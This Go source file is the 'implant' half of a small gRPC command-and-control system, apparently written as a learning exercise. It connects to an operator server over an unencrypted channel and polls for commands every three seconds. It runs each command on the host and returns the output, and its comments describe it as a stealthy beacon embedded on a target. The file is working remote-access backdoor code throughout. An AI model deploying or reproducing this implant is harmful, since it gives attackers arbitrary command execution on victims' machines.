package main

import (
	"context"
	"fmt"
	"gore/grpcapi"
	"log"
	"os/exec"
	"strings"
	"time"

	"google.golang.org/grpc"
)

/*
This implant binary will be listening to commands from the server, and polls for instructions. When it gets one, it executes an OS instruction.

	The name is a bit differnet; the implant is what would be called the client in a normal C2 infrastructre, and the client.go program in this file tree is actually the admin component for us as the Operators.
	Client is our API client, not our callback client. Think of this more like a beacon, or an "implant" that is embedded on the target like a tic in some way.
*/
func main() {
	var (
		opts   []grpc.DialOption
		conn   *grpc.ClientConn
		err    error
		client grpcapi.ImplantClient //created generically from the protoc compiler.
	)
	//may have to be careful with this, and might get one of those bastard ""deprectiated"" alerts.
	//a not-so ismple fix might be to just bite the bullet and assign a self-signed SSL cert that expires i the year 2090 or something.
	//according to foum posts, "grpc.Dial(":9950", grpc.WithTransportCredentials(insecure.NewCredentials()))" is also a way to do this.
	//https://stackoverflow.com/questions/70482508/grpc-withinsecure-is-deprecated-use-insecure-newcredentials-instead
	opts = append(opts, grpc.WithInsecure()) //we would need to alter this to include the certificate
	//connect to server application
	if conn, err = grpc.Dial(fmt.Sprintf("localhost:%d", 5000), opts...); err != nil {
		log.Fatal(err)
		//do something here to try to reconnect.
	}
	//clean up only on exit
	defer conn.Close()
	client = grpcapi.NewImplantClient(conn) //use protoc compiled functions

	ctx := context.Background() //essesntially, a complex method for waiting for changes in the HTTP traffic
	for {
		var req = new(grpcapi.Empty)
		cmd, err := client.FetchCommand(ctx, req) //make a call to the client, passing in a request context and an "Empty" struct.
		if err != nil {
			log.Fatal(err)
		}
		if cmd.In == "" {
			//nothing to do, no input commands.
			time.Sleep(3 * time.Second) //wait 3 seconds. could be more to increase stealth/decrease resource usage.
			//debug printing
			//fmt.Println("[:] Sleeping...")
			continue //repeat the loop
		}
		//tokenize the input from the server
		tokens := strings.Split(cmd.In, " ") //split by spaces
		var instr *exec.Cmd                  //golang specific method of executing syscalls is with "exec"
		if len(tokens) == 1 {
			instr = exec.Command(tokens[0]) //if only one token, then execute the first.
		} else {
			instr = exec.Command(tokens[0], tokens[1:]...) //exec works like execl in C, by executing a command as a vector of inputs
		}
		//
		buffer, err := instr.CombinedOutput()
		if err != nil {
			cmd.Out = err.Error()
		}
		//assign the commad the reconstituted tokenized input
		cmd.Out += string(buffer)
		//send to the client the
		client.SendOutput(ctx, cmd) //when a comamd is issued, it sends the output back to the sender via contexts.
	}
}
